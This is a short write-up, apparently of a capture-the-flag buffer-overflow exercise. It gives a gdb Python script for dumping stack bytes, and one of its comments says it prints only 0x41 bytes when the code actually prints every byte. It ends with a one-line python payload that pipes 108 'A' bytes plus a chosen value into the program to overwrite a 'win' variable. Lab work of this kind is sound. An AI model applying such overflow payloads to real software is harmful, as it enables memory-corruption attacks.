In this challenge we will overflow the buffer so that we can get to the memory location of win variable

First I entered 4,5 A as input to see where the input variable starts from.

And for that i used the python script to print out all the stack from rsp to rbp.

```python
import gdb

# Function to read memory from rsp and print address and value if it's 0x41
def print_stack(rsp, rbp):
    num_bytes = rbp - rsp
    print(f"Reading memory from {hex(rsp)} to {hex(rsp + num_bytes)}:")

    # Iterate over the range of bytes
    
    for i in range(num_bytes+1):
        # Calculate the current memory address
        current_address = rsp + i
        
        # Read each byte from the address
        byte_value = gdb.parse_and_eval('*((unsigned char*){})'.format(hex(current_address)))

        # Print the address and value only if the value is 0x41
        print(f"Address: {hex(current_address)} | Value: {hex(byte_value)}")


# Get the current stack pointer (rsp)
rsp = gdb.parse_and_eval("$rsp")
rbp = gdb.parse_and_eval("$rbp")
print_stack(rsp, rbp)
```

Now we know from where the input buffer starts from and from that we know that win variable right next to it and loose variable right after win variable

The value of the win variable can be found out using gdb

Since we cannot have `\n` we will use python for this

    python -c 'import sys; sys.stdout.buffer.write(b"A"*(108) + b"\xe4\x64\x12\x5b")' | ./program
